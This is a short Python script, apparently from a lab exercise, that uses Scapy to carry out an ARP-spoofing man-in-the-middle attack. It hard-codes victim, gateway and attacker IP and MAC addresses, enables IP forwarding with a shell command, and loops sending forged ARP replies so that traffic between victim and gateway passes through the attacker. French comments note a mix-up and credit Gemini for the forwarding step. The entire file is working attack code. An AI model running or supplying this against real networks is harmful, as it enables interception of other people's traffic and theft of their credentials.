from scapy.all import *
import os

ip_gtw = "10.1.10.254"
mac_gtw = "ca:01:42:98:00:00"

ip_victim = "10.1.10.10"  #ip de browser (oui je me suis trompé)
mac_victim = "08:00:27:1f:68:f6"

atk_ip = "10.1.10.14"
mac_atk = "08:00:27:89:49:da"

os.system("sysctl -w net.ipv4.ip_forward=1") # ma kali elle routait pas dcp gemini m'a dis de mettre ca et authorise ip forwarding via iptables

def arp_mitm():
 while True:

  sendp( Ether(src=mac_atk,dst=mac_victim)/ARP(op="is-at", psrc=ip_gtw, pdst=ip_victim))


  sendp( Ether(src=mac_atk,dst=mac_gtw)/ARP(op="is-at", psrc=ip_victim, pdst=ip_gtw) )

  time.sleep(2)


arp_mitm()
